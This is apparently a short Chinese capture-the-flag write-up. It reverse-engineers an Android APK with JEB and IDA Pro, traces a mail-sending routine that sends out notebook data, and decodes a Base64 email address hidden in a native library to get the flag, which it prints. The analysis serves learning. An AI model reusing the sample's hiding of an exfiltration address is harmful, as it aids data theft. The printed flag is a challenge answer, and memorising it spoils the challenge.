## 0x01 - Decompile
使用`JEB`打开apk，搜索关键字`mail`，发现函数`sendMailByJavaMail`。
按`X`交叉引用找到`A2.sendMailByJavaMail(C2.MAILSERVER, v9, notebooks);`
故查看`C2.MAILSERVER`的交叉引用，在`C2`的构造函数中找到：
```java
System.loadLibrary("core");
C2.MAILSERVER = Base64.decode(NativeMethod.m());
```

故用`IDA Pro`打开`libcore.so`，找到`Java_com_net_cn_NativeMethod_m`：
```cpp
int __fastcall Java_com_net_cn_NativeMethod_m(int a1)
{
  return (*(int (__fastcall **)(int, const char *))(*(_DWORD *)a1 + 668))(a1, "MTgyMTg0NjUxMjVAMTYzLmNvbQ==");
}
```

故得到邮箱：
```python
import base64

print(base64.decodebytes(b'MTgyMTg0NjUxMjVAMTYzLmNvbQ=='))
```

## 0x02 - Flag
`flag{18218465125@163.com}`
